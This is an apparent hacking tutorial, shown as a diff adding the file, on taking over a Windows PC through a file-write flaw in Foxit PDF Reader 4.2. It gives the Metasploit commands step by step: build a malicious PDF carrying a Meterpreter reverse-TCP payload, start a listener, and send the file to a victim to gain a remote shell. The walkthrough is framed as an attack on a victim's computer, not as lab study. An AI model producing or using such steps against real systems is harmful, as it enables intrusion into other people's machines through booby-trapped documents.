@@ -1,0 +1,27 @@
+
+Hack Remote Windows PC using Foxit PDF Reader 4.2 JavaScript File Write Exploit
+
+This module exploits an unsafe JavaScript API implemented in Foxit PDF Reader version 4.2. The create Data Object () JavaScript API function allows for writing arbitrary files to the file system. This issue was fixed in version 4.3.1.0218. Note: This exploit uses the All Users directory currently, which required administrator privileges to write to. This means an administrative user has to open the file to be successful. Kind of lame but that’s how it goes sometimes in the world of file write bugs.
+Foxit Reader 4.2
+Windows XP SP 2
+Windows 7
+Attacker: Backtrack 5
+Victim PC: Windows XP
+Open backtrack terminal type msfconsole
+
+Now type use exploit/windows/fileformat/foxit_reader_filewrite
+Msf exploit (foxit_reader_filewrite)>set payload windows/meterpreter/reverse_tcp
+Msf exploit (foxit_reader_filewrite)>set lhost 192.168.1.4 (IP of Local Host)
+Msf exploit (foxit_reader_filewrite)>set filename scripts.pdf
+Msf exploit (foxit_reader_filewrite)>exploit
+
+After we successfully generate the malicious PDF File, it will stored on your local computer
+/root/.msf4/local/scripts.pdf
+
+Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.1.4
+exploit 
+Now send your scripts.pdf files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer
+
